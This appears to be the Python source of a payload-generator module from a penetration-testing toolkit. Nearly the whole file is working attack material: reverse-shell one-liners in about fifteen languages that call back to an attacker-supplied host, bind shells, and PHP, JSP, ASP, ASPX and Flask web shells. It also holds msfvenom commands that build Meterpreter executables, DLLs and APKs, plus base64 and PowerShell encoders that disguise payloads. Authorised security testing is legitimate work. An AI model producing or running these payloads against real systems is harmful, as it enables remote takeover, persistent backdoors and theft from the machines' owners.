"""Payload Generator — reverse shells, web shells, encoded payloads, msfvenom wrappers.

One-stop payload factory for penetration testing.
"""

import sys
import os
import base64
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_with_preview
from tool_manager import check_tool, ensure_tool

# ─── Reverse Shell Templates ─────────────────────────────────────────────────

REVERSE_SHELLS = {
    "Bash TCP": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "Bash UDP": "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
    "Python3": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    "Python2": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    "PHP": 'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "Perl": 'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\'',
    "Ruby": 'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "Netcat -e": "nc -e /bin/sh {lhost} {lport}",
    "Netcat mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "Socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
    "PowerShell": 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    "Java": 'Runtime r = Runtime.getRuntime(); String[] cmd = {{"/bin/bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}}; Process p = r.exec(cmd);',
    "Lua": 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{lhost}\',\'{lport}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\')"',
    "Node.js": '(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();',
}

# ─── Web Shell Templates ─────────────────────────────────────────────────────

WEB_SHELLS = {
    "PHP Simple": '<?php system($_GET["cmd"]); ?>',
    "PHP Eval": '<?php eval($_POST["cmd"]); ?>',
    "PHP Stealth": '<?php $k="cmd";if(isset($_REQUEST[$k])){echo "<pre>";$c=$_REQUEST[$k];system($c);echo "</pre>";die;} ?>',
    "PHP File Upload": '''<?php
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'],basename($_FILES['f']['name']));
    echo "Uploaded: ".basename($_FILES['f']['name']);
}
if(isset($_GET['cmd'])){echo "<pre>".shell_exec($_GET['cmd'])."</pre>";}
?>
<form method="POST" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" value="Upload"></form>''',
    "JSP": '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
    "ASP": '<%eval request("cmd")%>',
    "ASPX": '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()%>',
    "Python Flask": '''from flask import Flask, request
import subprocess
app = Flask(__name__)
@app.route('/cmd')
def cmd():
    return subprocess.check_output(request.args.get('cmd','id'), shell=True)
app.run(host='0.0.0.0', port=8080)''',
}

# ─── Bind Shell Templates ────────────────────────────────────────────────────

BIND_SHELLS = {
    "Netcat": "nc -lvnp {lport} -e /bin/sh",
    "Python3": 'python3 -c \'import socket,os;s=socket.socket();s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")\'',
    "Socat": "socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
    "PHP": 'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{lport});socket_listen($s,1);$cl=socket_accept($s);while(1){{if(!socket_write($cl,"$ ",2))die;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){{socket_write($cl,fread($cmd,2048),2048);}}pclose($cmd);}}\'',
    "Perl": 'perl -e \'use Socket;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}};\'',
}

# ─── Encoding Functions ──────────────────────────────────────────────────────

def _encode_base64(payload):
    return base64.b64encode(payload.encode()).decode()

def _encode_url(payload):
    return urllib.parse.quote(payload)

def _encode_hex(payload):
    return payload.encode().hex()

def _encode_double_url(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def _encode_unicode(payload):
    return ''.join(f'\\u{ord(c):04x}' for c in payload)

def _wrap_base64_bash(payload):
    b64 = _encode_base64(payload)
    return f"echo {b64} | base64 -d | bash"

def _wrap_base64_powershell(payload):
    # PowerShell uses UTF-16LE for encoded commands
    encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
    return f"powershell -EncodedCommand {encoded}"


# ─── MSFVenom Wrapper ─────────────────────────────────────────────────────────

MSFVENOM_PAYLOADS = {
    "Linux Reverse TCP (ELF)": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o reverse.elf",
    "Linux Meterpreter (ELF)": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o meterpreter.elf",
    "Windows Reverse TCP (EXE)": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o reverse.exe",
    "Windows Meterpreter (EXE)": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o meterpreter.exe",
    "Windows Meterpreter (DLL)": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll -o payload.dll",
    "PHP Reverse Shell": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o shell.php",
    "Python Reverse Shell": "msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -f raw",
    "ASP Reverse Shell": "msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f asp -o shell.asp",
    "JSP Reverse Shell": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp",
    "WAR Reverse Shell": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war",
    "Android APK": "msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk",
    "macOS Reverse Shell": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o reverse.macho",
    "Shellcode (C)": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c",
    "Shellcode (Python)": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python",
}


# ─── Main Menu ────────────────────────────────────────────────────────────────

def run(session):
    show_stage_header("Payload Generator", "Generate shells, payloads, and encoded commands")

    while True:
        options = [
            ("1", "Reverse Shell Generator (15 languages)"),
            ("2", "Bind Shell Generator"),
            ("3", "Web Shell Generator (PHP/JSP/ASP/ASPX)"),
            ("4", "MSFVenom Payload Generator"),
            ("5", "Payload Encoder (Base64/URL/Hex/Unicode)"),
            ("6", "Listener Setup Helper"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _reverse_shells()
        elif choice == "2":
            _bind_shells()
        elif choice == "3":
            _web_shells(session)
        elif choice == "4":
            _msfvenom(session)
        elif choice == "5":
            _encoder()
        elif choice == "6":
            _listener_setup()


def _reverse_shells():
    lhost = ask("Your IP (LHOST)")
    lport = ask("Your port (LPORT)", default="4444")

    console.print(f"\n[bold green]Reverse Shells for {lhost}:{lport}[/bold green]\n")

    for name, template in REVERSE_SHELLS.items():
        try:
            shell = template.format(lhost=lhost, lport=lport)
        except (KeyError, IndexError):
            shell = template.replace("{lhost}", lhost).replace("{lport}", lport)
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"  [white]{shell}[/white]\n")

    # Offer encoded versions
    if confirm("\nGenerate Base64-encoded versions?", default=False):
        console.print("\n[bold cyan]Base64 Encoded:[/bold cyan]\n")
        # Most useful: bash
        bash_shell = REVERSE_SHELLS["Bash TCP"].format(lhost=lhost, lport=lport)
        console.print(f"  [yellow]Bash (base64):[/yellow]")
        console.print(f"  [white]{_wrap_base64_bash(bash_shell)}[/white]\n")

        ps_shell = REVERSE_SHELLS["PowerShell"].format(lhost=lhost, lport=lport)
        console.print(f"  [yellow]PowerShell (encoded):[/yellow]")
        console.print(f"  [white]{_wrap_base64_powershell(ps_shell)}[/white]\n")


def _bind_shells():
    lport = ask("Bind port (LPORT)", default="4444")

    console.print(f"\n[bold green]Bind Shells on port {lport}[/bold green]\n")

    for name, template in BIND_SHELLS.items():
        shell = template.replace("{lport}", lport)
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"  [white]{shell}[/white]\n")

    console.print(f"[bold cyan]To connect:[/bold cyan]")
    console.print(f"  [white]nc <target_ip> {lport}[/white]\n")


def _web_shells(session):
    console.print("\n[bold cyan]Web Shell Generator[/bold cyan]\n")

    shell_options = [(str(i+1), name) for i, name in enumerate(WEB_SHELLS.keys())]
    shell_options.append(("0", "Back"))
    choice = show_menu(shell_options)

    if choice == "0":
        return

    idx = int(choice) - 1
    shell_name = list(WEB_SHELLS.keys())[idx]
    shell_code = WEB_SHELLS[shell_name]

    console.print(f"\n[bold yellow]{shell_name}:[/bold yellow]")
    console.print(f"[white]{shell_code}[/white]\n")

    if confirm("Save to file?", default=False):
        ext_map = {"PHP": ".php", "JSP": ".jsp", "ASP": ".asp", "ASPX": ".aspx", "Python": ".py"}
        ext = ".php"
        for key, val in ext_map.items():
            if key.lower() in shell_name.lower():
                ext = val
                break
        filename = ask("Filename", default=f"shell{ext}")
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "w") as f:
            f.write(shell_code)
        success(f"Web shell saved: {filepath}")


def _msfvenom(session):
    if not check_tool("msfconsole"):
        warning("Metasploit is not installed. Commands will be shown for reference.")

    lhost = ask("Your IP (LHOST)")
    lport = ask("Your port (LPORT)", default="4444")

    console.print(f"\n[bold cyan]MSFVenom Payloads for {lhost}:{lport}[/bold cyan]\n")

    payload_options = [(str(i+1), name) for i, name in enumerate(MSFVENOM_PAYLOADS.keys())]
    payload_options.append(("a", "Show ALL commands"))
    payload_options.append(("0", "Back"))
    choice = show_menu(payload_options)

    if choice == "0":
        return
    elif choice == "a":
        for name, cmd in MSFVENOM_PAYLOADS.items():
            formatted = cmd.format(lhost=lhost, lport=lport)
            console.print(f"  [yellow]{name}:[/yellow]")
            console.print(f"  [white]{formatted}[/white]\n")
    else:
        idx = int(choice) - 1
        name = list(MSFVENOM_PAYLOADS.keys())[idx]
        cmd = MSFVENOM_PAYLOADS[name].format(lhost=lhost, lport=lport)
        console.print(f"\n  [yellow]{name}:[/yellow]")
        console.print(f"  [white]{cmd}[/white]\n")

        if check_tool("msfconsole") and confirm("Generate this payload now?"):
            run_with_preview(cmd, session, "exploitation")


def _encoder():
    console.print("\n[bold cyan]Payload Encoder[/bold cyan]\n")
    payload = ask("Enter payload string to encode")

    encodings = {
        "Base64": _encode_base64(payload),
        "URL Encoded": _encode_url(payload),
        "Double URL Encoded": _encode_double_url(payload),
        "Hex": _encode_hex(payload),
        "Unicode": _encode_unicode(payload),
        "Base64 Bash Wrapper": _wrap_base64_bash(payload),
    }

    for name, encoded in encodings.items():
        console.print(f"\n  [bold yellow]{name}:[/bold yellow]")
        console.print(f"  [white]{encoded}[/white]")

    console.print()


def _listener_setup():
    lport = ask("Listener port", default="4444")

    console.print(f"\n[bold cyan]Listener Commands (port {lport}):[/bold cyan]\n")

    listeners = {
        "Netcat": f"nc -lvnp {lport}",
        "Netcat (with readline)": f"rlwrap nc -lvnp {lport}",
        "Socat (full PTY)": f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
        "Ncat (SSL)": f"ncat --ssl -lvnp {lport}",
        "Metasploit multi/handler": f"msfconsole -q -x 'use multi/handler; set payload generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; exploit'",
        "Python listener": f"python3 -c \"import socket;s=socket.socket();s.bind(('0.0.0.0',{lport}));s.listen(1);print('Listening...');c,a=s.accept();print(f'Connected: {{a}}');import subprocess;subprocess.call(['/bin/sh'],stdin=c,stdout=c,stderr=c)\"",
    }

    for name, cmd in listeners.items():
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"  [white]{cmd}[/white]\n")

    if confirm("Start a listener now?", default=False):
        choice_opts = [(str(i+1), name) for i, name in enumerate(listeners.keys())]
        choice_opts.append(("0", "Cancel"))
        c = show_menu(choice_opts)
        if c != "0":
            cmd = list(listeners.values())[int(c)-1]
            run_with_preview(cmd, None, "exploitation")
